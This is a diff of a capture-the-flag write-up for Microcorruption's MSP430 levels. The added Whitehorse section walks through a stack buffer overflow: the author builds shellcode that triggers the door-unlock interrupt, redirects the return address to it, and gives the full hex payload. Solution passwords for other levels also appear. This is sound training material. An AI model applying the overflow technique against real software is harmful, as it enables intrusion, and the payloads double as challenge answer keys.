@@ -135,7 +135,7 @@ Because `0xc6` is not anywhere on the ASCII table, we cant send a string. Instea
 
 Password (Hex): `4141414141414141414141414141414141c64644`
 
-### Reykjavik
+## Reykjavik
 
 #### Exploit: Static Analysis
 
@@ -157,3 +157,72 @@ Where `-0x24(r4)` is the address of your input.
 Put simply... we key in an input of `0x0e 0x1d`, and we pass the check!
 
 Password (Hex): `0e1d`
+
+## Whitehorse
+
+#### Exploit: Running a Shell code
+
+In this exercise, we are exposed to a very simple example of corrupting the return address to point to a shell code.
+
+This tactic is very widely used in "real" tools.
+
+We also need to do some manual reading to find out the following important information:
+
+    INT is an interrupt, which does a corresponding action depending on what value is on the stack
+
+    - 0x7D
+    
+    Takes in two arguments: The password, and an address.
+    If this is on the stack on interrupt, we test a password, and if it's correct, we write the a flag to the address
+    
+    - 0x7E
+    
+    Takes in one argument: The password
+    If this is on the stack on interrupt, we test a password, and if it's correct, we unlock the door
+    
+    - 0x7F
+    
+    Takes in no arguments
+    If this is on the stack on interrupt, we unlock the door (no password testing required)
+    
+Quite simply, our shell code needs to place `0x7F` on the stack, and call `INT`.
+ 
+And to call our shell code, we need to overflow the buffer to overwrite the return address to our input
+ 
+Referencing the code, there is an existing chunk that does something similar
+ 
+```
+445c:  3012 7e00      push	#0x7e
+4460:  b012 3245      call	#0x4532 <INT>
+```
+    
+We need to modify it place `0x7f` on the stack instead of `0x7e`
+
+```
+445c:  3012 7f00      push	#0x7f
+4460:  b012 3245      call	#0x4532 <INT>
+```
+
+Viola! Our shell code is thus `30127f00b0123245`
+
+Now, to call the shell code, we need to overwrite the address of ret to point to it.
+
+All our inputs start at the same address `0x346c`
+
+Keying in password `testing123`, we observe the memory to be
+
+```
+3460:   0000 9045 0200 6c34 3000 1245 7465 7374   ...E..l40..Etest
+3470:   696e 6731 3233 0000 0000 0000 3c44 0000   ing123......<D..
+```
+
+The return address is `0x3c44`, and we have to overwrite that to redirect to `0x346c`, which is the start of our shellcode.
+
+Our shell code `30127f00b0123245` takes up 8 hex values, so we need to fill it with another 8 random characters, and end it with `0x346c` (or `6c34` for endianess) to overwrite the return address
+
+```
+3460:   0000 9045 0200 6c34 3000 1245 3012 7f00   ...E..l40..E0. .
+3470:   b012 3245 3131 3131 3131 3131 6c34 0000   ..2E11111111l4..
+```
+
+Password (Hex): `30127f00b012324531313131313131316c34`
